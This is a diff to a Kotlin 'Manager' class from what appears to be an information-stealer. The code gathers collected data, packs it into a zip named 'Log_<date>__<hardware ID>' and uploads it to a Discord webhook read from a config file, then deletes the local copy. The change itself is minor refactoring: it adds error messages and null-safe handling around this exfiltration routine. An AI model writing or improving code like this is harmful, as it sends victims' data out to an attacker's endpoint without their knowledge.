@@ -1,11 +1,11 @@
 package maven.example.com.utility
 
 import maven.example.com.receiving.ReceivingManager
+import maven.example.com.receiving.system.Hwid
 import maven.example.com.sending.DiscordManager
 import maven.example.com.utility.archive.Archive
 import maven.example.com.utility.config.Config
 import maven.example.com.utility.data.Data
-import maven.example.com.utility.rest.Hwid
 import java.io.File
 import java.io.IOException
 import java.io.InputStream
@@ -19,14 +19,15 @@ class Manager {
             val config = Config.readConfigFromFile(inputStream)
             val dataToSend = ReceivingManager.receiving()
             val client =
-                DiscordManager.getDiscordSender(config.prop?.getProperty("discord.webhook.url")?:throw NullPointerException())
+                DiscordManager.getDiscordSender(config.prop?.getProperty("discord.webhook.url")
+                    ?: throw NullPointerException("Discord Webhook URL doesnt not be null!"))
             val nameArchive = createLogName(SimpleDateFormat("d-M-y--z"))
             val archive: File?
 
             try {
                 archive = createArchive(dataToSend, nameArchive)
             } catch (e: Exception) {
-                //Log.error("Ошибка при создании архива:\n${e.stackTraceToString()}")
+                System.err.println("Ошибка при создании архива:\n${e.stackTraceToString()}")
                 client.close()
                 return
             }
@@ -34,7 +35,7 @@ class Manager {
             if (archive != null) client.send(archive)
 
             client.close()
-            archive!!.delete()
+            archive?.delete()
         }
 
         private fun createLogName(df: DateFormat): String = "Log_${df.format(Date())}__${Hwid.getHwid()}.zip"
